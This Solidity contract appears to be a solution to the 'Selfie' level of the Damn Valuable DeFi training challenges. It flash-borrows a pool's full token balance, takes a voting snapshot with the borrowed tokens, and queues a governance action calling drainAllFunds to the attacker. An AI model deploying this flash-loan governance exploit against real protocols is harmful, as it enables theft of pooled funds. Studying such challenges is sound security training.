// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";

/**
 * @title SelfieAttacker
 */
contract SelfieAttacker {

    SelfiePool private immutable _pool;
    DamnValuableTokenSnapshot private immutable _token;
    SimpleGovernance private immutable _governance;
    address private _receiver;

    constructor(address poolAddress, address tokenAddress, address governanceAddress) {
        _pool = SelfiePool(poolAddress);
        _token = DamnValuableTokenSnapshot(tokenAddress);
        _governance = SimpleGovernance(governanceAddress);
    }

    function attack() public {
        console.log("attack() - sender = ", msg.sender);
        _receiver = msg.sender;

        // get the current available balance in the pool
        uint256 borrowAmount = _token.balanceOf(address(_pool));

        // borrow the total amount available
        _pool.flashLoan(borrowAmount);
    }


    function receiveTokens(address _tokenAddress, uint256 borrowedAmount) public {
        console.log("receiveTokens() - ", borrowedAmount);
        // force a snapshot to be taken on the ERC20 token
        _token.snapshot();

        // using the SimpleGovernance token to create a queued action
        uint256 actionId = _governance.queueAction(
            address(_pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                _receiver
            ),
            0 // wei amount for gas
        );
        // return the borrowedAmount back to the pool
        _token.transfer(address(_pool), borrowedAmount);
    }
}